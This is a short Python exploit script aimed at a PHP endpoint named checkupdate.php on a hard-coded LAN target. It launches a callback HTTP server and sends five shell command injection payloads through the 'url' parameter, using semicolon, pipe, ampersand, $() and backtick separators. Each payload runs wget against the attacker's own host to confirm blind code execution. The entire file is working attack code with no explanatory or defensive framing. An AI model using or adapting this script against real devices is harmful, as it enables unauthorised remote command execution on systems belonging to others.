import requests
import http.server
import socketserver
import threading
import time

TARGET_IP = "192.168.1.173"
LOCAL_IP = "192.168.1.11"
PORT = 8000

def start_server():
    class RequestHandler(http.server.SimpleHTTPRequestHandler):
        def do_GET(self):
            print(f"\n[+] CALLBACK RECEIVED: {self.path}")
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"PWNED")

    socketserver.TCPServer.allow_reuse_address = True
    with socketserver.TCPServer(("", PORT), RequestHandler) as httpd:
        print(f"[+] Server listening on port {PORT}")
        httpd.timeout = 2
        start_time = time.time()
        while time.time() - start_time < 30:
            httpd.handle_request()

def exploit():
    t = threading.Thread(target=start_server)
    t.daemon = True
    t.start()
    
    time.sleep(1)
    
    payloads = [
        f";wget http://{LOCAL_IP}:{PORT}/pwn1;",
        f"|wget http://{LOCAL_IP}:{PORT}/pwn2;",
        f"&wget http://{LOCAL_IP}:{PORT}/pwn3;",
        f"$(wget http://{LOCAL_IP}:{PORT}/pwn4)",
        f"`wget http://{LOCAL_IP}:{PORT}/pwn5`"
    ]
    
    # Try different paths to checkupdate.php
    paths = [
        "/inc/checkupdate.php",
        "/api/inc/checkupdate.php",
        "/www/inc/checkupdate.php"
    ]
    
    for path in paths:
        for i, payload in enumerate(payloads):
            url = f"http://{TARGET_IP}{path}"
            params = {'url': payload}
            
            print(f"[+] Testing {url} with payload {i+1}...")
            try:
                requests.get(url, params=params, timeout=2)
            except:
                pass
            
            # Also try without parameter name (if it takes argv from query string?)
            # Unlikely for PHP web.
            
    # Wait for callbacks
    time.sleep(10)

if __name__ == "__main__":
    exploit()
